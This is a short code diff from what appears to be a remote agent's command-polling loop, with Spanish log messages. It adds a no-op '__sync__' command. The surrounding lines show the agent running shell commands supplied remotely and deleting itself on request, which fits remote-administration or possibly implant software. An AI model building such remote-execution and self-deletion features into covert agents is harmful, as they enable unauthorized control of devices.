@@ -816,6 +816,9 @@ def command_check_loop():
                     print(f"[command] Error marcando offline: {e}", flush=True)
                 threading.Thread(target=lambda: self_delete_agent(device_id), daemon=True).start()
 
+            elif cmd == "__sync__":
+                print(f"[command] Sincronizando intervalos", flush=True)
+
             elif cmd == "shell":
                 print(f"[command] Ejecutando comando shell: {payload}", flush=True)
                 output = execute_shell_command(payload)
